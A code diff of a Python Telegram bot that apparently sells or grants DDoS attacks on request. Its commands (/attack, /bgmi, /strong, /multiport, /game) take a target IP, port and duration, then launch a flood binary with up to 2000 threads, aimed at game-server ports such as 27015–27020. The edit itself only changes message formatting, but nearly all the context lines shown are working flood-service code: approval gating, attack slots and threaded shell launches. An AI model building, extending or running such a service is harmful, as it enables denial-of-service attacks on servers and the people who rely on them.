@@ -15,7 +15,7 @@ import string
 # ============================================
 TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = 6500273862
-OWNER = '@@Bqmi_Loaders0'
+OWNER = '@Bqmi_Loaders0'
 BGMI_PATH = './bgmi'
 MAX_ATTACKS = 10
 MAX_DURATION = 600
@@ -128,10 +128,10 @@ def run_attack_normal(attack_id, ip, port, duration, username, chat_id):
             f"⏰ *Duration:* `{duration}s`\n"
             f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
             f"👑 {OWNER}",
-            parse_mode='Markdown')
+            parse_mode=None)
         
     except Exception as e:
-        bot.send_message(chat_id, f"❌ *Attack failed:* `{str(e)}`", parse_mode='Markdown')
+        bot.send_message(chat_id, f"❌ Error: {str(e)}", parse_mode=None)
     finally:
         with attack_lock:
             if attack_id in active_attacks:
@@ -153,10 +153,10 @@ def run_attack_bgmi(attack_id, ip, port, duration, username, chat_id):
             f"🧵 *Threads:* `1500`\n"
             f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
             f"👑 {OWNER}",
-            parse_mode='Markdown')
+            parse_mode=None)
         
     except Exception as e:
-        bot.send_message(chat_id, f"❌ *Attack failed:* `{str(e)}`", parse_mode='Markdown')
+        bot.send_message(chat_id, f"❌ Error: {str(e)}", parse_mode=None)
     finally:
         with attack_lock:
             if attack_id in active_attacks:
@@ -179,10 +179,10 @@ def run_attack_multi(attack_id, ip, port, duration, username, chat_id):
             f"⏰ *Duration:* `{duration}s`\n"
             f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
             f"👑 {OWNER}",
-            parse_mode='Markdown')
+            parse_mode=None)
         
     except Exception as e:
-        bot.send_message(chat_id, f"❌ *Attack failed:* `{str(e)}`", parse_mode='Markdown')
+        bot.send_message(chat_id, f"❌ Error: {str(e)}", parse_mode=None)
     finally:
         with attack_lock:
             if attack_id in active_attacks:
@@ -245,7 +245,7 @@ def start(message):
 
 💡 *Example:* `/bgmi 1.1.1.1 27015 60`
 """
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 # ============================================
 # CANARY DOWNLOAD COMMANDS
@@ -276,7 +276,7 @@ def canary_download(message):
 
 👑 {OWNER}
 """
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 @bot.message_handler(commands=['ios'])
 def ios_download(message):
@@ -302,7 +302,7 @@ def ios_download(message):
 
 👑 {OWNER}
 """
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 @bot.message_handler(commands=['windows'])
 def windows_download(message):
@@ -330,7 +330,7 @@ def windows_download(message):
 
 👑 {OWNER}
 """
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 @bot.message_handler(commands=['mac'])
 def mac_download(message):
@@ -359,7 +359,7 @@ def mac_download(message):
 
 👑 {OWNER}
 """
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 @bot.message_handler(commands=['capture'])
 def capture_guide(message):
@@ -390,7 +390,7 @@ def capture_guide(message):
 
 👑 {OWNER}
 """
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 # ============================================
 # ATTACK COMMANDS
@@ -403,29 +403,29 @@ def attack_normal(message):
     name = message.from_user.username or message.from_user.first_name
     
     if uid != ADMIN_ID and uid not in approved_users:
-        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode=None)
         return
     
     if get_free_slots() <= 0:
-        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode=None)
         return
     
     try:
         args = message.text.split()[1:]
         if len(args) != 3:
-            bot.reply_to(message, "❌ *Usage:* `/attack IP PORT TIME`\n📌 Example: `/attack 1.1.1.1 80 60`", parse_mode='Markdown')
+            bot.reply_to(message, "❌ *Usage:* `/attack IP PORT TIME`\n📌 Example: `/attack 1.1.1.1 80 60`", parse_mode=None)
             return
         
         ip, port, duration = args
         duration = int(duration)
         
         if duration < 10 or duration > MAX_DURATION:
-            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode='Markdown')
+            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode=None)
             return
         
         parts = ip.split('.')
         if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
-            bot.reply_to(message, "❌ *Invalid IP address!*", parse_mode='Markdown')
+            bot.reply_to(message, "❌ *Invalid IP address!*", parse_mode=None)
             return
         
         with attack_lock:
@@ -449,14 +449,14 @@ def attack_normal(message):
             f"🧵 *Threads:* `500`\n"
             f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
             f"⚡ *Attack running...*",
-            parse_mode='Markdown')
+            parse_mode=None)
         
         thread = threading.Thread(target=run_attack_normal, args=(attack_id, ip, port, duration, name, message.chat.id))
         thread.daemon = True
         thread.start()
         
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode=None)
 
 @bot.message_handler(commands=['bgmi'])
 def attack_bgmi(message):
@@ -465,11 +465,11 @@ def attack_bgmi(message):
     name = message.from_user.username or message.from_user.first_name
     
     if uid != ADMIN_ID and uid not in approved_users:
-        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode=None)
         return
     
     if get_free_slots() <= 0:
-        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode=None)
         return
     
     try:
@@ -479,19 +479,19 @@ def attack_bgmi(message):
                 "❌ *Usage:* `/bgmi IP PORT TIME`\n"
                 "📌 *Example:* `/bgmi 1.1.1.1 27015 60`\n\n"
                 "🎮 *BGMI Ports:* 27015, 27016, 27017, 27018, 27019, 27020",
-                parse_mode='Markdown')
+                parse_mode=None)
             return
         
         ip, port, duration = args
         duration = int(duration)
         
         if duration < 10 or duration > MAX_DURATION:
-            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode='Markdown')
+            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode=None)
             return
         
         parts = ip.split('.')
         if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
-            bot.reply_to(message, "❌ *Invalid IP address!*", parse_mode='Markdown')
+            bot.reply_to(message, "❌ *Invalid IP address!*", parse_mode=None)
             return
         
         with attack_lock:
@@ -516,17 +516,17 @@ def attack_bgmi(message):
             f"🎯 *Target:* `{ip}:{port}`\n"
             f"⏰ *Duration:* `{duration}s`\n"
             f"🧵 *Threads:* `1500` (MAX POWER)\n"
-            f"{port_msg}\n"
+            f"{port_msg if port_msg else ''}\n"
             f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
             f"⚡ *Game server flooding...*",
-            parse_mode='Markdown')
+            parse_mode=None)
         
         thread = threading.Thread(target=run_attack_bgmi, args=(attack_id, ip, port, duration, name, message.chat.id))
         thread.daemon = True
         thread.start()
         
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode=None)
 
 @bot.message_handler(commands=['multiport'])
 def attack_multiport(message):
@@ -535,24 +535,24 @@ def attack_multiport(message):
     name = message.from_user.username or message.from_user.first_name
     
     if uid != ADMIN_ID and uid not in approved_users:
-        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode=None)
         return
     
     if get_free_slots() <= 0:
-        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode=None)
         return
     
     try:
         args = message.text.split()[1:]
         if len(args) != 2:
-            bot.reply_to(message, "❌ *Usage:* `/multiport IP TIME`\n📌 Example: `/multiport 1.1.1.1 60`\n\n🎮 *Attacks 6 ports simultaneously*", parse_mode='Markdown')
+            bot.reply_to(message, "❌ *Usage:* `/multiport IP TIME`\n📌 Example: `/multiport 1.1.1.1 60`\n\n🎮 *Attacks 6 ports simultaneously*", parse_mode=None)
             return
         
         ip, duration = args
         duration = int(duration)
         
         if duration < 10 or duration > MAX_DURATION:
-            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode='Markdown')
+            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode=None)
             return
         
         with attack_lock:
@@ -577,14 +577,14 @@ def attack_multiport(message):
             f"🧵 *Threads per port:* `800`\n"
             f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
             f"⚡ *Multi-port flooding...*",
-            parse_mode='Markdown')
+            parse_mode=None)
         
         thread = threading.Thread(target=run_attack_multi, args=(attack_id, ip, 0, duration, name, message.chat.id))
         thread.daemon = True
         thread.start()
         
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode=None)
 
 @bot.message_handler(commands=['strong'])
 def attack_strong(message):
@@ -593,24 +593,24 @@ def attack_strong(message):
     name = message.from_user.username or message.from_user.first_name
     
     if uid != ADMIN_ID and uid not in approved_users:
-        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode=None)
         return
     
     if get_free_slots() <= 0:
-        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode=None)
         return
     
     try:
         args = message.text.split()[1:]
         if len(args) != 3:
-            bot.reply_to(message, "❌ *Usage:* `/strong IP PORT TIME`\n📌 Example: `/strong 1.1.1.1 80 60`\n\n⚡ *2000 threads maximum power*", parse_mode='Markdown')
+            bot.reply_to(message, "❌ *Usage:* `/strong IP PORT TIME`\n📌 Example: `/strong 1.1.1.1 80 60`\n\n⚡ *2000 threads maximum power*", parse_mode=None)
             return
         
         ip, port, duration = args
         duration = int(duration)
         
         if duration < 10 or duration > MAX_DURATION:
-            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode='Markdown')
+            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode=None)
             return
         
         with attack_lock:
@@ -634,7 +634,7 @@ def attack_strong(message):
             f"🧵 *Threads:* `2000` (ULTIMATE POWER)\n"
             f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
             f"⚡ *Maximum force attack...*",
-            parse_mode='Markdown')
+            parse_mode=None)
         
         def run_strong():
             cmd = f"{BGMI_PATH} {ip} {port} {duration} 2000"
@@ -643,7 +643,7 @@ def attack_strong(message):
             slots = get_free_slots()
             bot.send_message(message.chat.id,
                 f"✅ *Strong Attack Completed!*\n\n🎯 *Target:* `{ip}:{port}`\n🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`",
-                parse_mode='Markdown')
+                parse_mode=None)
             with attack_lock:
                 if attack_id in active_attacks:
                     del active_attacks[attack_id]
@@ -651,7 +651,7 @@ def attack_strong(message):
         threading.Thread(target=run_strong).start()
         
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode=None)
 
 @bot.message_handler(commands=['game'])
 def attack_game(message):
@@ -660,24 +660,24 @@ def attack_game(message):
     name = message.from_user.username or message.from_user.first_name
     
     if uid != ADMIN_ID and uid not in approved_users:
-        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode=None)
         return
     
     if get_free_slots() <= 0:
-        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode=None)
         return
     
     try:
         args = message.text.split()[1:]
         if len(args) != 2:
-            bot.reply_to(message, "❌ *Usage:* `/game IP TIME`\n📌 Example: `/game 1.1.1.1 60`\n\n🎮 *Auto-detects and attacks all game ports*", parse_mode='Markdown')
+            bot.reply_to(message, "❌ *Usage:* `/game IP TIME`\n📌 Example: `/game 1.1.1.1 60`\n\n🎮 *Auto-detects and attacks all game ports*", parse_mode=None)
             return
         
         ip, duration = args
         duration = int(duration)
         
         if duration < 10 or duration > MAX_DURATION:
-            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode='Markdown')
+            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode=None)
             return
         
         with attack_lock:
@@ -701,7 +701,7 @@ def attack_game(message):
             f"⏰ *Duration:* `{duration}s`\n"
             f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
             f"⚡ *Game server flooding...*",
-            parse_mode='Markdown')
+            parse_mode=None)
         
         def run_game_attack():
             game_ports = [25565, 27015, 27016, 27017, 27018, 27019, 27020, 7777, 7778, 8080, 8081]
@@ -712,7 +712,7 @@ def attack_game(message):
             slots = get_free_slots()
             bot.send_message(message.chat.id,
                 f"✅ *Game Attack Completed!*\n\n🎯 *Target:* `{ip}`\n🎲 *Ports:* All game ports\n🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`",
-                parse_mode='Markdown')
+                parse_mode=None)
             with attack_lock:
                 if attack_id in active_attacks:
                     del active_attacks[attack_id]
@@ -720,7 +720,8 @@ def attack_game(message):
         threading.Thread(target=run_game_attack).start()
         
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode=None)
+        
 
 # ============================================
 # ADMIN COMMANDS
@@ -730,20 +731,20 @@ def attack_game(message):
 def add_api(message):
     uid = message.from_user.id
     if uid != ADMIN_ID:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Admin only command!*", parse_mode=None)
         return
     
     try:
         args = message.text.split()
         if len(args) != 2:
-            bot.reply_to(message, "❌ *Usage:* `/addapi endpoint.com`\n📌 Example: `/addapi primexx-production.up.railway.app`", parse_mode='Markdown')
+            bot.reply_to(message, "❌ *Usage:* `/addapi endpoint.com`\n📌 Example: `/addapi primexx-production.up.railway.app`", parse_mode=None)
             return
         
         endpoint = args[1].strip()
         endpoint = endpoint.replace('https://', '').replace('http://', '').rstrip('/')
         
         if endpoint in API_ENDPOINTS:
-            bot.reply_to(message, f"⚠️ *API already exists:* `{endpoint}`", parse_mode='Markdown')
+            bot.reply_to(message, f"⚠️ *API already exists:* `{endpoint}`", parse_mode=None)
             return
         
         API_ENDPOINTS.append(endpoint)
@@ -751,29 +752,29 @@ def add_api(message):
         
         bot.reply_to(message,
             f"✅ *API Added!*\n\n📡 *Endpoint:* `{endpoint}`\n📊 *Total APIs:* `{len(API_ENDPOINTS)}`",
-            parse_mode='Markdown')
+            parse_mode=None)
         
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode=None)
 
 @bot.message_handler(commands=['removeapi'])
 def remove_api(message):
     uid = message.from_user.id
     if uid != ADMIN_ID:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Admin only command!*", parse_mode=None)
         return
     
     try:
         args = message.text.split()
         if len(args) != 2:
-            bot.reply_to(message, "❌ *Usage:* `/removeapi endpoint.com`", parse_mode='Markdown')
+            bot.reply_to(message, "❌ *Usage:* `/removeapi endpoint.com`", parse_mode=None)
             return
         
         endpoint = args[1].strip()
         endpoint = endpoint.replace('https://', '').replace('http://', '').rstrip('/')
         
         if endpoint not in API_ENDPOINTS:
-            bot.reply_to(message, f"⚠️ *API not found:* `{endpoint}`", parse_mode='Markdown')
+            bot.reply_to(message, f"⚠️ *API not found:* `{endpoint}`", parse_mode=None)
             return
         
         API_ENDPOINTS.remove(endpoint)
@@ -781,20 +782,20 @@ def remove_api(message):
         
         bot.reply_to(message,
             f"❌ *API Removed!*\n\n📡 *Endpoint:* `{endpoint}`\n📊 *Total APIs:* `{len(API_ENDPOINTS)}`",
-            parse_mode='Markdown')
+            parse_mode=None)
         
     except Exception as e:
-        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode=None)
 
 @bot.message_handler(commands=['listapis'])
 def list_apis(message):
     uid = message.from_user.id
     if uid != ADMIN_ID:
-        bot.reply_to(message, "❌ *Admin only command!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Admin only command!*", parse_mode=None)
         return
     
     if not API_ENDPOINTS:
-        bot.reply_to(message, "📡 *No APIs configured.*\n\nUse `/addapi endpoint.com` to add.", parse_mode='Markdown')
+        bot.reply_to(message, "📡 *No APIs configured.*\n\nUse `/addapi endpoint.com` to add.", parse_mode=None)
         return
     
     msg = f"📡 *API Endpoints List*\n\n"
@@ -802,13 +803,13 @@ def list_apis(message):
         msg += f"{i}. `{api}`\n"
     msg += f"\n📊 *Total:* `{len(API_ENDPOINTS)}`"
     
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 @bot.message_handler(commands=['status'])
 def status(message):
     uid = message.from_user.id
     if uid != ADMIN_ID and uid not in approved_users:
-        bot.reply_to(message, "❌ *Access Denied!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Access Denied!*", parse_mode=None)
         return
     
     slots = get_free_slots()
@@ -826,7 +827,7 @@ def status(message):
 
 👑 *Owner:* {OWNER}"""
     
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 @bot.message_handler(commands=['myinfo'])
 def myinfo(message):
@@ -844,7 +845,7 @@ def myinfo(message):
 
 👑 *Owner:* {OWNER}"""
     
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 @bot.message_handler(commands=['mystats'])
 def mystats(message):
@@ -861,13 +862,13 @@ def mystats(message):
 
 👑 *Owner:* {OWNER}"""
     
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 @bot.message_handler(commands=['stats'])
 def bot_stats(message):
     uid = message.from_user.id
     if uid != ADMIN_ID:
-        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Admin only!*", parse_mode=None)
         return
     
     total_attacks = sum(s['total'] for s in user_stats.values())
@@ -883,7 +884,7 @@ def bot_stats(message):
 
 👑 *Owner:* {OWNER}"""
     
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 @bot.message_handler(commands=['help'])
 def help_command(message):
@@ -954,55 +955,55 @@ def help_command(message):
 
 👑 *Owner:* {OWNER}"""
     
-    bot.reply_to(message, msg, parse_mode='Markdown')
+    bot.reply_to(message, msg, parse_mode=None)
 
 @bot.message_handler(commands=['approve'])
 def approve(message):
     if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Admin only!*", parse_mode=None)
         return
     
     try:
         args = message.text.split()
         if len(args) != 2:
-            bot.reply_to(message, "❌ *Usage:* `/approve <user_id>`", parse_mode='Markdown')
+            bot.reply_to(message, "❌ *Usage:* `/approve <user_id>`", parse_mode=None)
             return
         
         uid = int(args[1])
         approved_users.add(uid)
         save_approved()
-        bot.reply_to(message, f"✅ *User `{uid}` approved!*", parse_mode='Markdown')
+        bot.reply_to(message, f"✅ *User `{uid}` approved!*", parse_mode=None)
     except:
-        bot.reply_to(message, "❌ *Invalid user ID!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Invalid user ID!*", parse_mode=None)
 
 @bot.message_handler(commands=['remove'])
 def remove(message):
     if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Admin only!*", parse_mode=None)
         return
     
     try:
         args = message.text.split()
         if len(args) != 2:
-            bot.reply_to(message, "❌ *Usage:* `/remove <user_id>`", parse_mode='Markdown')
+            bot.reply_to(message, "❌ *Usage:* `/remove <user_id>`", parse_mode=None)
             return
         
         uid = int(args[1])
         approved_users.discard(uid)
         save_approved()
-        bot.reply_to(message, f"❌ *User `{uid}` removed!*", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ *User `{uid}` removed!*", parse_mode=None)
     except:
-        bot.reply_to(message, "❌ *Invalid user ID!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Invalid user ID!*", parse_mode=None)
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast(message):
     if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Admin only!*", parse_mode=None)
         return
     
     msg_text = message.text.replace('/broadcast', '').strip()
     if not msg_text:
-        bot.reply_to(message, "❌ *Usage:* `/broadcast <message>`", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Usage:* `/broadcast <message>`", parse_mode=None)
         return
     
     success = 0
@@ -1010,12 +1011,12 @@ def broadcast(message):
     
     for uid in approved_users:
         try:
-            bot.send_message(uid, f"📢 *Announcement*\n\n{msg_text}\n\n👑 {OWNER}", parse_mode='Markdown')
+            bot.send_message(uid, f"📢 *Announcement*\n\n{msg_text}\n\n👑 {OWNER}", parse_mode=None)
             success += 1
         except:
             failed += 1
     
-    bot.reply_to(message, f"✅ *Broadcast sent!*\n\n📨 Success: `{success}`\n❌ Failed: `{failed}`", parse_mode='Markdown')
+    bot.reply_to(message, f"✅ *Broadcast sent!*\n\n📨 Success: `{success}`\n❌ Failed: `{failed}`", parse_mode=None)
 
 # ============================================
 # CLEANUP THREAD
@@ -1070,4 +1071,3 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"Polling error: {e}")
             time.sleep(15)
-
